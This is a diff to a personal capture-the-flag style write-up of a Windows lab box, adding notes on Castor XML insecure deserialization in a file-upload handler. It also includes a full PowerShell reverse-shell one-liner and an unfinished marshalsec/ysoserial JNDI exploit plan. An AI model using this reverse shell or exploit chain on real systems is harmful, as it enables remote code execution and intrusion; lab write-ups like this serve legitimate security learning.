@@ -1,4 +1,4 @@
-Tags: #Hard #Windows #Spring-Boot #FTP #FTP-Anonymous-Login #Source-Code-Analysis #Java 
+Tags: #Hard #Windows #Spring-Boot #FTP #FTP-Anonymous-Login #Source-Code-Analysis #Java #Insecure-Deserialization #JNDI-Injection
 # **Nmap Results**
 
 ```text
@@ -135,7 +135,26 @@ Employee employee = (Employee)unmarshaller.unmarshal(targetReader);
 
 If you look at the earlier image of the website, you see that it allows the user to upload an XML file containing "Employee data". That file is passed as an argument to `parseXML()`, as you can see in `handleFileUpload()`. 
 
-Here, we have an Employee class that is instantiated by deserializing whatever's in that file, which is completely controlled by the user. This is known as **insecure deserialization**. 
+Here, we have an Employee class that is instantiated by deserializing whatever's in that file, which is completely controlled by the user. We've found a potential **insecure deserialization** vulnerability. 
+
+The `Unmarshaller` class is part of the "org.exolab.castor.xml" package, which builds (deserializes) Java objects from XML data. `marshalsec` has 2 gadget chains for the Castor package:
+
+![[Pasted image 20260401220920.png]]
+
+>[!note]
+>It's better to build and run a docker container that has Java 8 installed since modern versions throw an exception because of the deprecation and removal of a class called `SecurityManager`
+
+Reverse shell one-liner to use: 
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+Exploit path (maybe?):
+1. Use `marshalsec` to generate a malicious XML file. This will construct some object that, when deserialized, forces the server to make an RMI request to the value in the `<target-bean-name>` tag
+2. Use `ysoserial` to start a JRMP listener on port 1099 and specify the **CommonBeanutils1** gadget with the command you want to execute. When a request is received, it will send the serialized object containing the payload and get executed upon deserialization.
+
+Stupid thing isn't catching connections, probably something to do with Docker. IPs and ports are right
 <br>
 <br>
 # **Exploitation**
